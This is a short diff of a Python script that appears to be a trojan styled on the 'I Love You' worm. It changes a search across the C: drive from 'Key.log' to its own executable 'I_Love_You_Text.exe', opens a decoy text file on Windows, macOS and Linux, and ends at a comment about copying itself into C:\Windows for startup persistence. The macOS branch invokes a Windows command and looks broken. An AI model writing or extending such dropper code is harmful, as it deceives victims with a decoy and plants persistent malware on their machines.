@@ -19,7 +19,7 @@ def finder(name, path):
             return os.path.join( root, name )
 
 
-finder( 'Key.log', 'C:\\' )
+finder( 'I_Love_You_Text.exe', 'C:\\' )
 
 src = pathF
 pathDecoy = os.path.join( pathB, 'I_Love_You_Text.txt' )
@@ -33,9 +33,9 @@ with open( pathDecoy, 'w' ) as file:
 if platform.system() == 'Windows':  # Windows
     os.startfile( pathDecoy )
 elif platform.system() == 'Darwin':  # MacOS
-    subprocess.call( ('start', pathDecoy) )
+    subprocess.Popen( ['start', pathDecoy] )
 else:  # Linux
-    subprocess.call( ('xdg-open', pathDecoy) )
+    subprocess.Popen( ['xdg-open', pathDecoy] )
 
 # Copy file on startup to C:\Windows
 try:
